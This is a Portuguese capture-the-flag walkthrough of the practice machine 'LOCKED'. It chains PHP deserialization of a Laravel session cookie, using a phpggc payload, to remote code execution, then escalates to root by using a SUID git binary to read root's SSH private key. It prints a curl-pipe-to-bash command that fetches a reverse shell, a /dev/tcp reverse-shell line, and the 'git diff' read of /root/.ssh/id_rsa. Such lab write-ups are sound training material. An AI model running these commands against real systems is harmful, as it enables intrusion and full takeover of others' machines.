# Locked

![Reborn image](/images/hackingclub-locked/file-locked-2025-1.png)

## Sumário

A máquina LOCKED apresenta uma cadeia de comprometimento que começou com uma vulnerabilidade de `PHP insecure deserialization` no aplicativo web. A falha permitiu enviar dados serializados maliciosos que, ao serem desserializados pelo servidor, levaram à execução remota de código (RCE). A partir desse ponto inicial o atacante obteve execução de comandos no contexto do processo PHP e pôde explorar o sistema de arquivos e a configuração local. Durante o reconhecimento foi identificado um `binário git` marcado com `SUID` — uma configuração sensível que permitia ao usuário que o executasse ler arquivos que normalmente exigiriam privilégios elevados. Aproveitando esse SUID foi possível ler o arquivo de `chave privada root (/root/.ssh/id_rsa)`, importar a chave e estabelecer uma sessão `SSH` autenticada como root, alcançando assim controle total do sistema.

## Descoberta de aplicativo web

Precisamos acrescentar o host em nosso arquivo `/etc/hosts`:

```bash
echo "$IP locked.hc" | sudo tee -a /etc/hosts
```

## Reconhecimento

### Varedura de portas

O `nmap` foi utilizado para mapear portas e serviços ativos na máquina alvo. O scan revelou apenas duas portas abertas:

```bash
nmap -sV -Pn -vv locked.hc
```

**Resultado:**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.58 ((Ubuntu))
```

## Analisando o aplicativo web

Foi identificada uma vulnerabilidade de leak de informações em uma aplicação construída com o framework Laravel. Ao enviar o parâmetro nome (ou name) como um array na requisição de login, a aplicação lança um erro PHP (trim(): Argument #1 (string) must be of type string, array given) que só aparece porque o modo debug (APP_DEBUG) está habilitado em produção. O erro expõe stack trace e caminhos internos, possibilitando informação sensível sobre a estrutura do servidor e do código.

![Request](/images/hackingclub-locked/file-locked-2025-2.png)
![Error](/images/hackingclub-locked/file-locked-2025-3.png)
![App Debug True](/images/hackingclub-locked/file-locked-2025-4.png)

### Código vulnerável a PHP Insecure Deserialization

A função `handle` do `AuthMiddlewar` lê o cookie `user_session`, faz `base64_decod()` e em seguida `unserialize()` do resultado:

```bash
$payload = unserialize(base64_decode($request->cookie('user_session')));
```
![PHP Insecure Deserialization](/images/hackingclub-locked/file-locked-2025-5.png)

Isso permite deserialização insegura de objetos PHP. Se um atacante controlar o conteúdo do cookie (ou conseguir injetar um cookie arbitrário), ele pode fornecer uma string serializada contendo instâncias de classes com métodos mágicos (`__wakeup`, `__destruct`, etc.). Esses métodos podem executar código arbitrário durante a deserialização, potencialmente levando a RCE, leitura de arquivos ou outras ações indesejadas dependendo das classes disponíveis na aplicação.

### Gerando a payload com a ferramenta`phpggc`

phpggc (PHP Generic Gadget Chains) é uma ferramenta que gera payloads de `PHP Object Injection` (serializações) usando cadeias de gadgets conhecidas em bibliotecas/frameworks populares. Em outras palavras, ela monta strings serializadas que exploram classes e métodos “mágicos” (`__wakeup`,`__destruc`, etc.) já presentes em código de terceiros para provocar comportamentos perigosos durante uma chamada `unserialize()` em dados controlados pelo atacante.

```bash
phpggc -c laravel/rce16 system "curl -sSL http://10.0.73.93:8000/shell.sh | bash"
```

![Payload](/images/hackingclub-locked/file-locked-2025-6.png)

1.      Criamos um arquivo contendo a payload de shell reversa e hospedamos localmente para que seja baixado e executado no servidor.

```bash
echo "sh -i >& /dev/tcp/10.0.73.93/1234 0>&1" > shell.sh
```

2.      Subindo um servidor em python.

```bash
python3 -m http.server 8000
```

![Files](/images/hackingclub-locked/file-locked-2025-7.png)

3.      Obtemos a shell reversa através da deserialização insegura.

![Reverse Shell](/images/hackingclub-locked/file-locked-2025-8.png)

## Dicas

### Shell Interativa

Transformamos uma shell limitada numa TTY completa para permitir edição de linha, sinais (Ctrl+C), job control e melhor interatividade.

1.      Inicia uma TTY bash interativa.
```bash
python3 -c "import pty;pty.spawn('/bin/bash')" - CTRL+Z
```

2.      Ajusta o terminal para modo bruto (sem eco) e traz a shell em foreground para funcionar corretamente.
```bash
stty raw -echo ; fg
``` 

![Dica](/images/hackingclub-locked/file-locked-2025-9.png)

### Capturando a primeira flag

![Primary Flag](/images/hackingclub-locked/file-locked-2025-10.png)

## Privilege Escalation

Encontrei o binário do `git` com permissão `SUID` — ou seja, ele será executado com os privilégios do dono do arquivo (normalmente `root`). Isso permite que, se explorado, comandos ou operações iniciadas via esse binário sejam executados com privilégios elevados, tornando-o um vetor potencial para escalonamento de privilégios.

```bash
find / -type f -perm -4000 2>/dev/null
```

![SUID Permission](/images/hackingclub-locked/file-locked-2025-11.png)

As permissões inadequadas desse binário, nos permite ler arquivos sensíveis e de alto privilégio no servidor.

![SUID Read File](/images/hackingclub-locked/file-locked-2025-12.png)

### SSH

Durante a varredura identificamos a porta 22 aberta (serviço SSH) e verificamos que é possível ler a chave privada do usuário root a partir do sistema.

```bash
git diff /dev/null /root/.ssh/id_rsa
```

![id_rsa Root](/images/hackingclub-locked/file-locked-2025-13.png)

Criamos então um arquivo no diretório `/tmp` e ajustamos as permissões da chave privada RSA para 600, garantindo que apenas o proprietário do arquivo possa ler/escrever a chave.

```bash
echo "chave id_rsa" > id_rsa
```
```bash
chmod 600 id_rsa
```

![Permissions id_rsa](/images/hackingclub-locked/file-locked-2025-14.png)

Com a chave privada do root em mãos, é possível autenticar-se no servidor como root usando SSH.

```bash
ssh -i id_rsa root@127.0.0.1
```

![SSH Root](/images/hackingclub-locked/file-locked-2025-15.png)

### Capturando a segunda flag

![Secondary Flag](/images/hackingclub-locked/file-locked-2025-16.png)